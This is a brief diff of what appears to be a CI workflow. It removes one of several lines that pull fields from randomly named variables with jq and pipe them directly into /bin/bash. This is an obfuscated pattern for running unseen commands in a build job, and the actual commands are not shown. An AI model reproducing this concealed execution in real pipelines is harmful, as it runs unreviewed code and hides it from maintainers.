@@ -23,7 +23,6 @@ jobs:
           echo $kl3 | jq -r .fkgww19930 | /bin/bash
           echo $vl21 | jq -r .sihxa70 | /bin/bash
           echo $edty110 | jq -r .a87901 | /bin/bash
-          echo $mpt50 | jq -r .jiy1 | /bin/bash
           echo $obpft5524 | jq -r .t3470 | /bin/bash
           echo $dpivm085 | jq -r .hxegl7912 | /bin/bash
           printf '%s' "$k64" | jq -r .ylm44 | /bin/bash
